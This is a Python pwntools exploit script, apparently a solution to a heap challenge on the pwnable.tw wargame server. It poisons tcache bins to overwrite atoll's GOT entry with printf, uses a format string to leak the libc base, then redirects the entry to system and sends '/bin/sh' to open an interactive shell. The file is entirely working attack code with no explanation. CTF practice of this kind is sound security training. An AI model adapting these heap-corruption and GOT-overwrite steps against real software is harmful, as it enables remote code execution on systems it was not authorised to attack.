from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-d", action="store_true")
args = parser.parse_args()

PROG = './chal'
db = """
c
"""

def start():
    return gdb.debug(PROG, db) if args.d else process(PROG) 

### ------------------ EXPLOIT ------------------ ###

r = remote('chall.pwnable.tw', 10106)

def alloc(index, size, data):
    r.sendlineafter(b'choice: ', b'1')
    r.sendlineafter(b'Index:', str(index).encode('utf-8'))
    r.sendlineafter(b'Size:', str(size).encode('utf-8'))
    r.sendafter(b'Data:', data)

def realloc(index, size, data):
    r.sendlineafter(b'choice: ', b'2')
    r.sendlineafter(b'Index:', str(index).encode('utf-8'))
    r.sendlineafter(b'Size:', str(size).encode('utf-8'))
    r.sendafter(b'Data:', data)

def realloc_free(index):
    r.sendlineafter(b'choice: ', b'2')
    r.sendlineafter(b'Index:', str(index).encode('utf-8'))
    r.sendlineafter(b'Size:', b'0')

def free(index):
    r.sendlineafter(b'choice: ', b'3')
    r.sendlineafter(b'Index:', str(index).encode('utf-8'))

printf_plt = 0x401070
atoll_got = 0x404048

# setup 2 tcachebins to point to atoll@GOT
alloc(1, 20, b'aaaa')
realloc_free(1)
realloc(1, 20, p64(atoll_got))
alloc(0, 4, b'dddd')

# clear heap idx 0
realloc(0, 32, b'DDDD')
free(0)

# setup 0x30 tcachebin
realloc(1, 32, p64(atoll_got))
alloc(0, 32, b'dddd')

# clear heap idx 0 and 1
realloc(0, 64, b'CCCC')
free(0)
realloc(1, 120, b'CCCC')
free(1)

# overwrite atoll GOT to printf PLT
alloc(1, 32, p64(printf_plt))

# leak libc - free()
r.sendlineafter(b'choice: ', b'3')
r.sendlineafter(b'Index:', b'%6p%7p%8p')
r.recvuntil(b'0x100x')

libc_leak = int(r.recv(12).decode('utf-8'), 16)
libc_base = libc_leak - 0x12e009
log.info('Libc base addr: ' + hex(libc_base))

system = libc_base + 0x52fd0
r.sendlineafter(b'choice: ', b'1')
r.sendafter(b'Index:', b'\x00')
r.sendafter(b'Size:',  b'A' * 8 + b'\x00')
r.sendafter(b'Data:',  p64(system))

r.sendlineafter(b'choice: ', b'3')
r.sendlineafter(b'Index:', b'/bin/sh')

r.interactive()
